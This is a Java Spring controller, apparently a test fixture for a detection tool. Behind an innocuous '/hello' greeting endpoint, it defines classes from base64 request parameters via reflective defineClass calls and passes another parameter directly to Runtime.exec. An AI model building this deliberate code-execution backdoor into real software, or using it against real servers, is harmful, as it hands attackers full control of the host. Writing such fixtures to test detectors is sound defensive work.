package org.wanghailu.detector.test.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

@RestController
public class SimpleController {
/**/
    @GetMapping("/hello")
    public String helloWorld(String name, HttpServletRequest request) throws NoSuchMethodException {
        String payload = request.getParameter("payload");
        String methodName = request.getParameter("methodName");
        if(payload!=null){
            byte[] classData = Base64.getDecoder().decode(payload);
            if(methodName!=null){
                Method method = getMethod(methodName);
                invoke(method,classData);
            }

            invoke(getMethod2("defineClass"),classData);
        }
        String payload2 = request.getParameter("payload2");
        if(payload2!=null){
            test(payload2);
        }
        return "hello world," + name;
    }

    private Method getMethod(String methodName) throws NoSuchMethodException {
        Method method2 = Thread.currentThread().getContextClassLoader().getClass()
                .getDeclaredMethod
                        (methodName, new Class[]{String.class, byte[].class, int.class, int.class});
        return method2;
    }

    private Method getMethod2(String methodName) throws NoSuchMethodException {
        Method method = ClassLoader.class
                .getDeclaredMethod(methodName, new Class[]{String.class, byte[].class, int.class, int.class});
        return method;
    }



    public void invoke(Method method,byte[] classData){
        try {
            method.invoke(Thread.currentThread().getContextClassLoader(), classData, 0, classData.length);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    private void test(String payload2 ){
        try {
            Runtime.getRuntime().exec(payload2);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
